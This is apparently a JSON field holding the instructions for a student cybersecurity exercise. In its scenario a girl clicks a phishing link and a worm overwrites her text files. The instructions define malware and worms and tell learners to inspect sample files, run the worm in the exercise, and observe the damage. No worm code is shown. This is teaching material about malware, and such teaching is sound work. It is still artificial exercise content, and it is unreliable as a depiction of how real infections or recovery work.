    "long_instructions": "## **Scenario**\r\n\r\nWhile waiting for the school's club sign-up website to come back online, Haley checks her email. She notices a message from an address she doesn't recognize. The email claims there's an alternative sign-up link for clubs and encourages her to click it.\r\n\r\nWhen Haley clicks the link, something immediately downloads to her computer. Seconds later, she watches as all her local text files are overwritten. What can she do? Is there a way to undo this?\r\n\r\n---\r\n\r\n\r\n\r\n\r\n**Malware** is software designed to harm, disrupt, or gain unauthorized access to a system.\r\n\r\nA **worm** is a specific type of malware that spreads automatically from one device to another without needing to attach to a file. Once activated, a worm can replicate itself, move across networks, folders, or email systems, and damage or overwrite files.\r\n\r\n\r\n<br/><br/>\r\n\r\n**Step 1: Look Around**\r\n\r\nOpen and read the following files:\r\n\r\n* `my_essay.txt`\r\n* `science_project.txt`\r\n* `grades.txt`\r\n\r\n<br/><br/>\r\n\r\n**Step 2: Run the Worm**\r\n\r\nClick on the \"Run\" button to see what happens.\r\n<br/><br/>\r\n\r\n**Step 3: Check the Damage**\r\n\r\nLook at for any changes in the `.txt` files and console.\r\n\r\n<br/><br/>",
